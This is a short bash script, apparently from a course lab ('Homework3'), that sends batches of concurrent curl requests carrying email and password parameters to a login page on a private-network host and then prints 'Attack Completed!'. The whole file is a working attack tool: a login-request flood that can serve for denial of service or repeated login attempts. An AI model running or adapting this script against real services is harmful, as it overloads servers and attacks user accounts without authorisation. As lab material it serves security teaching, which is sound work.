#!/bin/bash

task(){
    curl -s "http://192.168.0.117/Homework3/final/index.php?email=aaaaaaaaaaaaaaa!&password=test" > /dev/null
}

# N-process batches, every batch has N concurrent processes
N=1000

(

# for loop
for thing in {0..100}; do

# initialize i = 1, e.g. N4, ((i=i%N)) will do the calculation, i = 1, ((i++==0)) will return false, so it will not wait and i=2
# when i = 4, ((i=i%N)) = 0, ((i++==0)) will return true and it will wait the previous process to complete
   ((i=i%N)); ((i++==0)) && wait
   
# execute the task concurrently
   task "$thing" &
done
)

echo "Attack Completed!"
